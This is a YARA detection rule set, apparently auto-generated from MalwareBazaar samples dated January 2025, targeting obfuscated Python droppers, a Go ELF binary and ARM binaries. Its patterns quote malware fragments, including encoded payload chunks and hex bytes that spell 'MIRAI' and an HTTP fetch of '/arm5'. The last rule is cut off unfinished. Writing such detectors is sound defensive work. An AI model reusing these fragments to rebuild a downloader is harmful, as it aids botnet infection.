/*
   YARA Rule Set
   Author: Sameer P Sheik
   Date: 2025-01-15
   Identifier: evidences
   Reference: https://datalake.abuse.ch/malware-bazaar/daily/
*/

/* Rule Set ----------------------------------------------------------------- */

rule sig_042da0fae4689b607361f84c054f4dba89b097d85d5323a0fd524648b5db8aba {
   meta:
      description = "evidences - file 042da0fae4689b607361f84c054f4dba89b097d85d5323a0fd524648b5db8aba.py"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "042da0fae4689b607361f84c054f4dba89b097d85d5323a0fd524648b5db8aba"
   strings:
      $s1 = "809a/e58082/e4bfb8/e580b0/e58091/e580a6/e5808a/e58089/e4bfb9/e58095/e58092/e5808d/e580ab/e580ad/e58099/e4bfb6/e4bfaf/e58091/e4bf" ascii
      $s2 = "85/e580b3/e580ac/e4bfb5/e580b9/e58098/e580b8/e580ae/e5808d/e580b1/e4bfaf/e5808b/e5808a/e4bfb0/e580b5/e580a1/e580a7/e580ad/e58091" ascii
      $s3 = "/e4bfaf/e58091/e58092/e58098/e58099/e580ab/e580ae/e580af/e4bfb9/e4bfab/e580ac/e58081/e58087/e580b7/e580b7/e5808d/e580b2/e4bfb4/e" ascii
      $s4 = "b9/e5808f/e580a8/e580ac/e580af/e58088/e580a8/e4bfb1/e580b0/e58096/e4bfaf/e580a3/e580a2/e580b4/e58097/e58097/e4bfb9/e58092/e580ab" ascii
      $s5 = "fb8/e580a2/e580b8/e4bfb7/e580b4/e580ba/e4bfb9/e580ab/e580ab/e5808b/e580b3/e4bfb0/e4bfb8/e58089/e580ba/e58084/e4bfb2/e4bfab/e4bfa" ascii
      $s6 = "97/e580ba/e58084/e5808c/e580b0/e580b8/e5808e/e4bfb7/e580b4/e580b3/e4bfb0/e580a5/e580a1/e58081/e4bfb5/e4bfab/e580a5/e58084/e580a5" ascii
      $s7 = "/e4bfb6/e4bfb2/e58082/e4bfb3/e4bfb4/e580a9/e58084/e580b4/e580ae/e5808b/e58093/e580a4/e4bfab/e58088/e58087/e580ac/e58092/e5809a/e" ascii
      $s8 = "e580b2/e4bfb2/e5808e/e580ab/e4bfb8/e580b9/e58082/e580af/e4bfaf/e58095/e5808f/e580ae/e5808d/e5808c/e580b5/e580a6/e580ba/e580a7/e4" ascii
      $s9 = "b7/e5808c/e580b2/e580b4/e4bfb1/e58081/e58082/e58097/e4bfaf/e580b9/e58085/e58089/e580a6/e580b9/e580a1/e4bfb9/e580b9/e58086/e58092" ascii
      $s10 = "/e4bfb2/e4bfb4/e58085/e580ad/e580aa/e4bfb5/e58096/e580a2/e580a9/e580a6/e58082/e5809a/e4bfab/e580a9/e5808b/e580b3/e58097/e580b9/e" ascii
      $s11 = "80b4/e4bfb1/e4bfb5/e580b4/e58093/e58081/e58097/e58094/e5808c/e580a8/e5808a/e4bfaf/e580a5/e4bfb9/e4bfb0/e580a4/e58094/e580b7/e580" ascii
      $s12 = "086/e580ae/e580a7/e58092/e4bfab/e580a5/e580aa/e580a1/e580b9/e4bfaf/e580a8/e5809a/e58095/e4bfaf/e58096/e5808e/e4bfb3/e580a7/e580a" ascii
      $s13 = "80b4/e58096/e4bfab/e58085/e5808f/e58086/e58082/e580ab/e580a4/e58099/e58091/e580b0/e580a3/e580a1/e58087/e580a5/e580a4/e4bfb1/e580" ascii
      $s14 = "2/e4bfb1/e5808e/e58097/e580b5/e5808c/e58091/e58082/e4bfb1/e58087/e58098/e4bfaf/e4bfb6/e580a4/e4bfb7/e580a3/e4bfab/e580a3/e580b4/" ascii
      $s15 = "8092/e58091/e580b7/e58093/e58086/e4bfb9/e4bfb0/e58088/e580ab/e580a1/e4bfaf/e5808c/e58085/e4bfaf/e4bfb4/e4bfb9/e580a7/e580a1/e580" ascii
      $s16 = "/e58085/e580a3/e5808c/e580b7/e4bfab/e5808b/e580b8/e4bfb2/e5808c/e4bfb5/e580a8/e58092/e5808b/e58088/e5809a/e580b5/e580b4/e580a8/e" ascii
      $s17 = "8082/e58088/e58089/e580b0/e580ba/e58097/e580b9/e580af/e580a9/e580ad/e58098/e580ba/e4bfb1/e4bfb9/e58094/e5808a/e4bfaf/e58095/e580" ascii
      $s18 = "80b3/e4bfb9/e58094/e4bfaf/e4bfb6/e58099/e4bfb0/e58090/e580b0/e580ae/e5808e/e5808c/e58089/e580a7/e58093/e4bfb0/e58098/e580aa/e580" ascii
      $s19 = "e58096/e58087/e580a9/e580b5/e5808b/e58082/e580a5/e4bfb0/e580b3/e580b4/e58083/e5808d/e4bfaf/e58094/e58088/e58091/e58091/e58086/e5" ascii
      $s20 = "80b5/e58084/e58093/e580b8/e4bfaf/e580ab/e58084/e580b4/e580ba/e58094/e5808e/e580b8/e58083/e580aa/e4bfb1/e580ae/e58091/e58083/e4bf" ascii
   condition:
      uint16(0) == 0x0dcb and filesize < 19000KB and
      8 of them
}

rule sig_15902b0e95f2e8fcb4a56e332a309385996aa394b6eccb3fc1c18e1574cfaed9 {
   meta:
      description = "evidences - file 15902b0e95f2e8fcb4a56e332a309385996aa394b6eccb3fc1c18e1574cfaed9.py"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "15902b0e95f2e8fcb4a56e332a309385996aa394b6eccb3fc1c18e1574cfaed9"
   strings:
      $s1 = "errorsr" fullword ascii
      $s2 = "_exec)" fullword ascii
      $s3 = "returnc" fullword ascii
      $s4 = "f1ac8393/f1ac828e/f1ac8387/f1ac82b6/f1ac8392/f1ac8397/f1ac8383/f1ac828f/f1ac82a0/f1ac838f/f1ac8390/f1ac8294/f1ac8290/f1ac8386/f1" ascii
      $s5 = "ac82ab/f1ac838f/f1ac8393/f1ac82b9/f1ac82b1/f1ac82b5/f1ac82b4/f1ac8384/f1ac82a0/f1ac82b0/f1ac82a9/f1ac8390/f1ac8391/f1ac82b1/f1ac" ascii
      $s6 = "0/f1ac838d/f1ac8381/f1ac8292/f1ac8298/f1ac82a2/f1ac8396/f1ac82b4/f1ac82b2/f1ac838e/f1ac8385/f1ac82af/f1ac8393/f1ac8292/f1ac8388/" ascii
      $s7 = "2ae/f1ac828a/f1ac8297/f1ac82b8/f1ac8395/f1ac8383/f1ac8295/f1ac8398/f1ac8388/f1ac8398/f1ac8385/f1ac82a7/f1ac8397/f1ac838c/f1ac839" ascii
      $s8 = "95/f1ac82b5/f1ac8382/f1ac8291/f1ac82b4/f1ac82b7/f1ac8295/f1ac8388/f1ac8393/f1ac8291/f1ac82b4/f1ac82aa/f1ac82b3/f1ac838b/f1ac8290" ascii
      $s9 = "94/f1ac838b/f1ac82b6/f1ac8391/f1ac82ad/f1ac8382/f1ac82b4/f1ac8395/f1ac8383/f1ac828f/f1ac8390/f1ac82ad/f1ac838a/f1ac838a/f1ac8293" ascii
      $s10 = "1ac8387/f1ac8295/f1ac82a4/f1ac8388/f1ac8388/f1ac82a8/f1ac8389/f1ac82b1/f1ac8394/f1ac82a8/f1ac8391/f1ac8380/f1ac82a3/f1ac8399/f1a" ascii
      $s11 = "97/f1ac82a8/f1ac8382/f1ac8390/f1ac8295/f1ac82b9/f1ac8291/f1ac838f/f1ac82a4/f1ac828f/f1ac82ab/f1ac8387/f1ac838a/f1ac8390/f1ac82a2" ascii
      $s12 = "ac82ae/f1ac8382/f1ac8390/f1ac838a/f1ac82b9/f1ac8295/f1ac828f/f1ac82b5/f1ac8387/f1ac82a3/f1ac838e/f1ac82ac/f1ac838d/f1ac82a0/f1ac" ascii
      $s13 = "ac82b3/f1ac82b6/f1ac8391/f1ac82a2/f1ac82ac/f1ac82a3/f1ac8388/f1ac8396/f1ac8396/f1ac82a2/f1ac828a/f1ac82b5/f1ac82b2/f1ac82ab/f1ac" ascii
      $s14 = "f1ac82a8/f1ac828e/f1ac838a/f1ac8290/f1ac828e/f1ac82a6/f1ac8393/f1ac82ac/f1ac82ab/f1ac8296/f1ac8294/f1ac828f/f1ac8388/f1ac8381/f1" ascii
      $s15 = "391/f1ac8389/f1ac82b0/f1ac82b8/f1ac82ab/f1ac8394/f1ac8297/f1ac82a3/f1ac82a0/f1ac8294/f1ac82a4/f1ac8383/f1ac8292/f1ac8298/f1ac838" ascii
      $s16 = "ac8398/f1ac8396/f1ac8382/f1ac838e/f1ac82b5/f1ac8398/f1ac8391/f1ac82b0/f1ac838a/f1ac82b7/f1ac8296/f1ac8290/f1ac828a/f1ac8298/f1ac" ascii
      $s17 = "3/f1ac8389/f1ac8397/f1ac82b8/f1ac8391/f1ac838c/f1ac82b1/f1ac82a9/f1ac8296/f1ac82a6/f1ac838e/f1ac8387/f1ac8396/f1ac82b9/f1ac82ab/" ascii
      $s18 = "1ac82a8/f1ac828f/f1ac8398/f1ac82aa/f1ac8393/f1ac82a8/f1ac82b5/f1ac838f/f1ac8290/f1ac82b8/f1ac8381/f1ac8297/f1ac82ad/f1ac82a2/f1a" ascii
      $s19 = "f1ac838c/f1ac82a8/f1ac838c/f1ac8290/f1ac838a/f1ac82b2/f1ac8297/f1ac8298/f1ac8292/f1ac8297/f1ac8396/f1ac82ae/f1ac828f/f1ac838b/f1" ascii
      $s20 = "ac838e/f1ac8293/f1ac82b7/f1ac8381/f1ac82ae/f1ac8298/f1ac8395/f1ac82aa/f1ac82b3/f1ac8293/f1ac8386/f1ac82b8/f1ac8297/f1ac8397/f1ac" ascii
   condition:
      uint16(0) == 0x0dcb and filesize < 13000KB and
      8 of them
}

rule sig_8f5719332a6afeca686071972a253a922c58d7da3a609d4e196c9ec8e5cd342d {
   meta:
      description = "evidences - file 8f5719332a6afeca686071972a253a922c58d7da3a609d4e196c9ec8e5cd342d.py"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "8f5719332a6afeca686071972a253a922c58d7da3a609d4e196c9ec8e5cd342d"
   strings:
      $s1 = "_exec)" fullword ascii
      $s2 = "returnc" fullword ascii
      $s3 = "a98a9d/f2a98a9e/f2a98b82/f2a98b82/f2a98ab3/f2a98ab4/f2a98b85/f2a98ab4/f2a98ab8/f2a98a93/f2a98abf/f2a98b80/f2a98b81/f2a98b80/f2a9" ascii
      $s4 = "/f2a98a82/f2a98ab0/f2a98aa2/f2a98b85/f2a98b88/f2a98abd/f2a98a93/f2a98a9b/f2a98aa4/f2a98a9f/f2a98a88/f2a98abb/f2a98ab4/f2a98abf/f" ascii
      $s5 = "b81/f2a98abd/f2a98aa5/f2a98a87/f2a98a9b/f2a98a81/f2a98b88/f2a98a84/f2a98a83/f2a98b88/f2a98aa6/f2a98b80/f2a98a88/f2a98aa4/f2a98ab" ascii
      $s6 = "f2a98b82/f2a98ab1/f2a98aa5/f2a98a94/f2a98aa4/f2a98abf/f2a98a85/f2a98a96/f2a989be/f2a98a83/f2a989be/f2a98ab5/f2a98ab9/f2a98ab7/f2" ascii
      $s7 = "a98a92/f2a98b81/f2a98ab3/f2a98a81/f2a98a93/f2a98ab7/f2a98b81/f2a98a9d/f2a98aa6/f2a98aa9/f2a98ab6/f2a98b84/f2a989be/f2a98ab0/f2a9" ascii
      $s8 = "989be/f2a98a99/f2a98aa5/f2a98ab0/f2a98b88/f2a98b80/f2a98a88/f2a98b86/f2a989bf/f2a98ab3/f2a98abb/f2a98ab4/f2a98abb/f2a98ab4/f2a98" ascii
      $s9 = "a98ab8/f2a98aa1/f2a98aa4/f2a98b81/f2a98a99/f2a98abf/f2a98b81/f2a98a94/f2a98a95/f2a98ab8/f2a98a95/f2a98a84/f2a98a84/f2a98abe/f2a9" ascii
      $s10 = "2a98a9a/f2a98aa3/f2a98aa6/f2a98ab0/f2a98ab4/f2a98a85/f2a989ba/f2a98b83/f2a989be/f2a98b88/f2a98abc/f2a98a86/f2a98ab7/f2a98ab1/f2a" ascii
      $s11 = "f2a98a90/f2a98ab2/f2a98aa2/f2a98abe/f2a98a80/f2a98a9b/f2a989bf/f2a98a87/f2a98a90/f2a98b89/f2a98b82/f2a98a94/f2a98aa4/f2a98b80/f2" ascii
      $s12 = "2a98ab9/f2a989be/f2a98a9c/f2a98a87/f2a98a93/f2a98b82/f2a98b80/f2a98b87/f2a98b88/f2a98ab2/f2a98ab9/f2a98abd/f2a98aa3/f2a98a86/f2a" ascii
      $s13 = "f2a98aa8/f2a98a83/f2a98a99/f2a98aa6/f2a98ab8/f2a98a85/f2a98a9e/f2a98a85/f2a98aa0/f2a98ab6/f2a98abb/f2a98a96/f2a98a92/f2a98b84/f2" ascii
      $s14 = "84/f2a98abd/f2a98aa6/f2a98aba/f2a98b87/f2a98aa6/f2a98a96/f2a98a99/f2a98a9e/f2a98a97/f2a98ab6/f2a98aa8/f2a98b86/f2a98aa5/f2a98b83" ascii
      $s15 = "/f2a98a9e/f2a98a9d/f2a98ab5/f2a98aa6/f2a98a90/f2a989bf/f2a98abb/f2a98a84/f2a98a81/f2a98a88/f2a98b85/f2a98aa2/f2a98aa3/f2a98a95/f" ascii
      $s16 = "a98ab6/f2a98b88/f2a98a94/f2a98b89/f2a98aa6/f2a98a84/f2a98b84/f2a98a86/f2a98a93/f2a98a95/f2a98a81/f2a98ab8/f2a98abd/f2a98ab8/f2a9" ascii
      $s17 = "4/f2a98a87/f2a98a86/f2a98a97/f2a98aa4/f2a989be/f2a98a9f/f2a98a9f/f2a98ab7/f2a98b89/f2a98a94/f2a98aa2/f2a98aa0/f2a98b87/f2a98aa1/" ascii
      $s18 = "a98a93/f2a98a95/f2a98b89/f2a98abf/f2a98ab0/f2a98abd/f2a98a9f/f2a98aa2/f2a98b87/f2a98a96/f2a98abe/f2a98a9d/f2a98aa4/f2a98aa9/f2a9" ascii
      $s19 = "3/f2a98a93/f2a98aba/f2a98a88/f2a98a90/f2a98aa1/f2a98a92/f2a98aa7/f2a98b88/f2a98b88/f2a98a98/f2a98aa7/f2a98a9b/f2a98a81/f2a98a80/" ascii
      $s20 = "aa5/f2a98aa0/f2a98aa6/f2a989bf/f2a98aa2/f2a98aa2/f2a98b88/f2a98b83/f2a98a94/f2a98b81/f2a98a90/f2a98a80/f2a98abc/f2a98ab0/f2a98a9" ascii
   condition:
      uint16(0) == 0x0dcb and filesize < 14000KB and
      8 of them
}

rule sig_98b8285720695a510f4b0cce46e4e85742f107ab8a811a67a78dd557084181a5 {
   meta:
      description = "evidences - file 98b8285720695a510f4b0cce46e4e85742f107ab8a811a67a78dd557084181a5.py"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "98b8285720695a510f4b0cce46e4e85742f107ab8a811a67a78dd557084181a5"
   strings:
      $s1 = "85/f39dbd82/f39dbd8e/f39dbc9b/f39dbd81/f39dbd88/f39dbd84/f39dbd88/f39dbc86/f39dbc9f/f39dbc88/f39dbcb7/f39dbd82/f39dbcbd/f39dbc8e" ascii
      $s2 = "7/f39dbcbc/f39dbd90/f39dbc8e/f39dbc85/f39dbcb7/f39dbc9c/f39dbcbb/f39dbc9d/f39dbc9d/f39dbc9f/f39dbd84/f39dbc9a/f39dbcb0/f39dbd8f/" ascii
      $s3 = "/f39dbc8e/f39dbc8d/f39dbcb0/f39dbd86/f39dbc8f/f39dbcbc/f39dbcbc/f39dbc87/f39dbcbd/f39dbd83/f39dbd8d/f39dbcbe/f39dbcbe/f39dbd89/f" ascii
      $s4 = "39dbd82/f39dbc99/f39dbcbf/f39dbd89/f39dbd87/f39dbd80/f39dbc88/f39dbc98/f39dbd81/f39dbc97/f39dbd86/f39dbd83/f39dbc9c/f39dbcbf/f39" ascii
      $s5 = "bd87/f39dbcb8/f39dbc9f/f39dbd8f/f39dbc97/f39dbd8a/f39dbd8a/f39dbcb8/f39dbd82/f39dbc9b/f39dbd8d/f39dbd87/f39dbd87/f39dbc9d/f39dbc" ascii
      $s6 = "1/f39dbd8c/f39dbc8b/f39dbc89/f39dbcbf/f39dbd84/f39dbd85/f39dbcbf/f39dbc88/f39dbcbe/f39dbc87/f39dbc9f/f39dbc99/f39dbc9b/f39dbc87/" ascii
      $s7 = "c86/f39dbc9b/f39dbcbe/f39dbcbe/f39dbd85/f39dbc99/f39dbcb9/f39dbc8d/f39dbd8d/f39dbd8b/f39dbc8a/f39dbd8c/f39dbc99/f39dbc99/f39dbc9" ascii
      $s8 = "4/f39dbd8c/f39dbcbe/f39dbd83/f39dbcb9/f39dbd81/f39dbd81/f39dbc84/f39dbd80/f39dbcba/f39dbd87/f39dbd83/f39dbcba/f39dbd81/f39dbc88/" ascii
      $s9 = "99/f39dbc97/f39dbc89/f39dbcbf/f39dbc8c/f39dbcb7/f39dbc99/f39dbc9c/f39dbd85/f39dbcbf/f39dbcbe/f39dbd8e/f39dbc8d/f39dbc8b/f39dbc99" ascii
      $s10 = "bc9d/f39dbd89/f39dbd82/f39dbd86/f39dbc99/f39dbd8b/f39dbc88/f39dbcba/f39dbd88/f39dbc8c/f39dbc98/f39dbc97/f39dbd82/f39dbd8a/f39dbd" ascii
      $s11 = "dbcbf/f39dbcb7/f39dbc81/f39dbc97/f39dbd8f/f39dbcb9/f39dbc98/f39dbc99/f39dbc9a/f39dbc8d/f39dbd86/f39dbc97/f39dbc9f/f39dbd8a/f39db" ascii
      $s12 = "f/f39dbc81/f39dbcbb/f39dbc9d/f39dbd8d/f39dbd8a/f39dbcb8/f39dbcb0/f39dbd82/f39dbcbe/f39dbcb0/f39dbd83/f39dbd8f/f39dbc8e/f39dbcbd/" ascii
      $s13 = "39dbc8c/f39dbd80/f39dbcbc/f39dbc9e/f39dbd83/f39dbc87/f39dbc97/f39dbc9a/f39dbc81/f39dbcbf/f39dbcb0/f39dbc88/f39dbc9d/f39dbd8f/f39" ascii
      $s14 = "81/f39dbc9f/f39dbc9f/f39dbd8b/f39dbcba/f39dbcb7/f39dbd82/f39dbcb0/f39dbcb7/f39dbd8c/f39dbd8a/f39dbc89/f39dbc8a/f39dbd8f/f39dbcb9" ascii
      $s15 = "f39dbd8f/f39dbd89/f39dbd84/f39dbc88/f39dbd88/f39dbcbb/f39dbc85/f39dbc85/f39dbc87/f39dbd83/f39dbc9c/f39dbc9a/f39dbcb7/f39dbcba/f3" ascii
      $s16 = "39dbc99/f39dbc9e/f39dbd84/f39dbc8f/f39dbc85/f39dbd87/f39dbc8d/f39dbd8c/f39dbc9b/f39dbcbd/f39dbc9a/f39dbc9f/f39dbd89/f39dbcb7/f39" ascii
      $s17 = "/f39dbd88/f39dbd8c/f39dbd8a/f39dbc98/f39dbc88/f39dbc88/f39dbc99/f39dbd80/f39dbc99/f39dbd8d/f39dbcbf/f39dbc9f/f39dbd82/f39dbc85/f" ascii
      $s18 = "dbd84/f39dbd82/f39dbcb7/f39dbcba/f39dbcbc/f39dbd81/f39dbc81/f39dbc9b/f39dbcba/f39dbcbd/f39dbc9e/f39dbc99/f39dbcb7/f39dbd87/f39db" ascii
      $s19 = "dbcba/f39dbd86/f39dbcbf/f39dbd84/f39dbcba/f39dbd84/f39dbd89/f39dbd80/f39dbc87/f39dbd87/f39dbcbe/f39dbc8a/f39dbc9b/f39dbc99/f39db" ascii
      $s20 = "dbd88/f39dbd89/f39dbbbe/f39dbd88/f39dbcbd/f39dbcba/f39dbd81/f39dbd81/f39dbcb8/f39dbd84/f39dbcb9/f39dbcba/f39dbcb5/f39dbcb7/f39db" ascii
   condition:
      uint16(0) == 0x0dcb and filesize < 14000KB and
      8 of them
}

rule sig_8787bfbd907e8acaa8c4e75901eb2a01efbdc6c93d33714204ad4b8ed1d7c48a {
   meta:
      description = "evidences - file 8787bfbd907e8acaa8c4e75901eb2a01efbdc6c93d33714204ad4b8ed1d7c48a.elf"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "8787bfbd907e8acaa8c4e75901eb2a01efbdc6c93d33714204ad4b8ed1d7c48a"
   strings:
      $x1 = "unsafe.String: len out of range.lib section in a.out corruptedcannot assign requested addresstls: unsupported public key: %TTLS:" ascii
      $x2 = "stopTheWorld: not stopped (status != _Pgcstop)runtime: name offset base pointer out of rangeruntime: type offset base pointer ou" ascii
      $x3 = "reflect: Bits of non-arithmetic Type reflect: NumField of non-struct type reflect: funcLayout of non-func type reflect.Value.Byt" ascii
      $x4 = "x509: invalid signature: parent certificate cannot sign this kind of certificatecrypto/ecdh: internal error: nistec ScalarBaseMu" ascii
      $x5 = "padding bytes must all be zeros unless AllowIllegalWrites is enabledhttp2: Transport conn %p received error from processing fram" ascii
      $x6 = "os/exec.Command(exec: killing Cmdexec: not started1192092895507812559604644775390625invalid bit size corrupt zip file fractional" ascii
      $x7 = "name is not in canonical format (it must end with a .)tls: server resumed a session with a different versiontls: server accepted" ascii
      $x8 = "/cpu/classes/idle:cpu-seconds/cpu/classes/user:cpu-seconds/gc/heap/allocs-by-size:bytes/gc/stack/starting-size:bytesgc done but " ascii
      $x9 = "span set block with unpopped elements found in resetcasfrom_Gscanstatus: gp->status is not in scan statetls: server selected uns" ascii
      $x10 = ".```reflect.Value.CanInterfaceinvalid argument to Int63ninvalid argument to Int31ncannot marshal DNS messagetoo many colons in a" ascii
      $x11 = "insufficient data for resource body lengthlooking for beginning of object key stringwebsocket: invalid compression negotiation R" ascii
      $x12 = "error connecting to udp addr %s, %serror sending disconnect packet, %ssuccessfully reconnected to gatewayreflect.MakeSlice of no" ascii
      $x13 = "accessed data from freed user arena runtime: wrong goroutine in newstackruntime: invalid pc-encoded table f=accessing a corrupte" ascii
      $x14 = "http: no Host in request URL18189894035458564758300781259094947017729282379150390625unsupported compression for GUILD_AUDIT_LOG_" ascii
      $x15 = "/etc/pki/tls/cacert.peminvalid PrintableStringx509: malformed UTCTimex509: invalid key usagex509: malformed versionflate: intern" ascii
      $x16 = "unlock: lock countprogToPointerMask: overflow/gc/cycles/forced:gc-cycles/memory/classes/other:bytes/memory/classes/total:bytesfa" ascii
      $x17 = "runqsteal: runq overflowdouble traceGCSweepStartlevel 2 not synchronizedlink number out of rangeout of streams resourcesfunction" ascii
      $x18 = "socks bindProcessingNo Content%s|%s%s|%sRST_STREAMEND_STREAMexecerrdot12207031256103515625ParseFloattime.Date(time.Local%!Weekda" ascii
      $x19 = "tls: internal error: unsupported key (%T)tls: handshake has not yet been performedinvalid value length: expected %d, got %dnet/u" ascii
      $x20 = "runtime: casgstatus: oldval=gcstopm: negative nmspinningfindrunnable: netpoll with psave on system g not allowednewproc1: newg m" ascii
   condition:
      uint16(0) == 0x457f and filesize < 24000KB and
      1 of ($x*)
}

rule sig_0577e1edccd9e6ac82ac314e3d2fec9b3c8cfa98f41d89f4bc193360e0402f8b {
   meta:
      description = "evidences - file 0577e1edccd9e6ac82ac314e3d2fec9b3c8cfa98f41d89f4bc193360e0402f8b.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "0577e1edccd9e6ac82ac314e3d2fec9b3c8cfa98f41d89f4bc193360e0402f8b"
   strings:
      $s1 = "xE1\\x08\\x00\\x9F\\xE5\"\"\\x02\\x30\\xA0\\xE1\\x0C\\x20\\xA0\\xE1\\x74\\x00\\x00\\xEA\\x03\\x00\\x90\\x00\\x04\\xE0\\x2D\\xE5" ascii
      $s2 = "F\\xE5\\x0E\\xF0\\xA0\\xE1\\xB0\\x03\\x01\\x00\\x61\\x72\\x6D\\x35\"\"\\x00\\x00\\x00\\x00\\x4D\\x49\\x52\\x41\\x49\\x0A\\x00\\x" ascii
      $s3 = "x00\"\"\\x00\\x80\\x00\\x00\\xB0\\x03\\x00\\x00\\xB0\\x03\\x00\\x00\\x05\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x01\\x00\\x00\\x00" ascii
      $s4 = "8\\x00\\x9F\\xE5\"\"\\x02\\x30\\xA0\\xE1\\x0C\\x20\\xA0\\xE1\\x8C\\x00\\x00\\xEA\\x05\\x00\\x90\\x00\\x04\\xE0\\x2D\\xE5\\x0C\\x" ascii
      $s5 = "x2D\\xE9\\x74\\x41\\x9F\\xE5\"\"\\x94\\xD0\\x4D\\xE2\\x00\\x00\\x00\\xEA\\x01\\x40\\x84\\xE2\\x00\\x60\\xD4\\xE5\\x00\\x00\\x56" ascii
      $s6 = "0\\xE1\\xAE\\xFF\\xFF\\xEB\\x04\\x00\\x50\\xE1\"\"\\x03\\x00\\xA0\\x13\\x92\\xFF\\xFF\\x1B\\x06\\x40\\xA0\\xE1\\x93\\x10\\x8D\\x" ascii
      $s7 = "0\\x54\\xE1\\xF3\\xFF\\xFF\\x1A\\x0D\\x10\\xA0\\xE1\"\"\\x80\\x20\\xA0\\xE3\\x05\\x00\\xA0\\xE1\\xA1\\xFF\\xFF\\xEB\\x00\\x20\\x" ascii
      $s8 = "xE3\\x00\\x40\\xA0\\xE1\\x70\\x80\\xBD\\x98\\x03\\x00\\x00\\xEB\"\"\\x00\\x30\\x64\\xE2\\x00\\x30\\x80\\xE5\\x00\\x00\\xE0\\xE3" ascii
      $s9 = "0\"\"\\xD0\\x03\\x00\\x00\\x02\\x00\\x00\\x00\\x34\\x00\\x20\\x00\\x02\\x00\\x28\\x00\\x05\\x00\\x04\\x00\\x01\\x00\\x00\\x00\\x" ascii
      $s10 = "1\\x67\\x65\\x6E\\x74\\x3A\\x20\\x57\\x67\\x65\\x74\\x2F\\x31\\x2E\\x31\"\"\\x0D\\x0A\\x0D\\x0A\\x00\\x00\\x00\\x00\\x46\\x49\\x" ascii
      $s11 = "1\\x9F\\xE5\\x58\\x11\\x9F\\xE5\"\"\\x06\\x20\\xA0\\xE3\\x01\\x00\\xA0\\xE3\\x04\\x80\\x63\\xE0\\xD9\\xFF\\xFF\\xEB\\x02\\x40\\x" ascii
      $s12 = "x2E\\x73\\x68\\x73\\x74\\x72\\x74\\x61\\x62\\x00\\x2E\\x74\\x65\\x78\\x74\"\"\\x00\\x2E\\x72\\x6F\\x64\\x61\\x74\\x61\\x00\\x2E" ascii
      $s13 = "x30\\xA0\\xE3\\x8E\\x10\\xA0\\xE3\"\"\\x35\\x20\\xA0\\xE3\\xB9\\x00\\xA0\\xE3\\x83\\xC0\\xCD\\xE5\\x80\\x40\\xCD\\xE5\\x81\\x60" ascii
      $s14 = "x46\\x0A\\x00\\x00\\x00\\x00\\x47\\x45\\x54\\x20\\x2F\\x61\\x72\\x6D\"\"\\x35\\x20\\x48\\x54\\x54\\x50\\x2F\\x31\\x2E\\x30\\x0D" ascii
      $s15 = "x00\\x00\\x01\\x00\\x00\\x00\\x03\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\"\\xB0\\x03\\x00\\x00\\x1E\\x00\\x00" ascii
      $s16 = "0\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"" fullword ascii
      $s17 = "D\\xE8\\x01\\x10\\xA0\\xE3\"\"\\x0D\\x20\\xA0\\xE1\\x08\\x00\\x9F\\xE5\\x6C\\x00\\x00\\xEB\\x0C\\xD0\\x8D\\xE2\\x00\\x80\\xBD\\x" ascii
      $s18 = "xE5\\x04\\x20\\xA0\\xE3\\xB5\\xFF\\xFF\\xEB\"\"\\x00\\x00\\x64\\xE2\\x9A\\xFF\\xFF\\xEB\\x28\\x40\\x88\\xE2\\x05\\x00\\xA0\\xE1" ascii
      $s19 = "x00\\x5C\\x03\\x00\\x00\\x54\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\"\"\\x04\\x00\\x00\\x00\\x01\\x00\\x00\\x00" ascii
      $s20 = "1\\x00\"\"\\xB0\\x03\\x01\\x00\\x00\\x00\\x00\\x00\\x08\\x00\\x00\\x00\\x06\\x00\\x00\\x00\\x00\\x80\\x00\\x00\\x01\\x18\\xA0\\x" ascii
   condition:
      uint16(0) == 0x5c22 and filesize < 10KB and
      8 of them
}

rule sig_1389bbd1bc3329495a992d9b00c08523851a52933a76354a81bb408360100d9b {
   meta:
      description = "evidences - file 1389bbd1bc3329495a992d9b00c08523851a52933a76354a81bb408360100d9b.unknown"
      author = "Sameer P Sheik"
      reference = "https://datalake.abuse.ch/malware-bazaar/daily/"
      date = "2025-01-15"
      hash1 = "1389bbd1bc3329495a992d9b00c08523851a52933a76354a81bb408360100d9b"
   strings:
      $s1 = "xE1\\x08\\x00\\x9F\\xE5\"\"\\x02\\x30\\xA0\\xE1\\x0C\\x20\\xA0\\xE1\\x74\\x00\\x00\\xEA\\x03\\x00\\x90\\x00\\x04\\xE0\\x2D\\xE5" ascii
      $s2 = "8\\x00\\x9F\\xE5\"\"\\x02\\x30\\xA0\\xE1\\x0C\\x20\\xA0\\xE1\\x8C\\x00\\x00\\xEA\\x05\\x00\\x90\\x00\\x04\\xE0\\x2D\\xE5\\x0C\\x" ascii
      $s3 = "x2D\\xE9\\x74\\x41\\x9F\\xE5\"\"\\x94\\xD0\\x4D\\xE2\\x00\\x00\\x00\\xEA\\x01\\x40\\x84\\xE2\\x00\\x60\\xD4\\xE5\\x00\\x00\\x56" ascii
      $s4 = "0\\xE1\\xAE\\xFF\\xFF\\xEB\\x04\\x00\\x50\\xE1\"\"\\x03\\x00\\xA0\\x13\\x92\\xFF\\xFF\\x1B\\x06\\x40\\xA0\\xE1\\x93\\x10\\x8D\\x" ascii
      $s5 = "0\\x54\\xE1\\xF3\\xFF\\xFF\\x1A\\x0D\\x10\\xA0\\xE1\"\"\\x80\\x20\\xA0\\xE3\\x05\\x00\\xA0\\xE1\\xA1\\xFF\\xFF\\xEB\\x00\\x20\\x" ascii
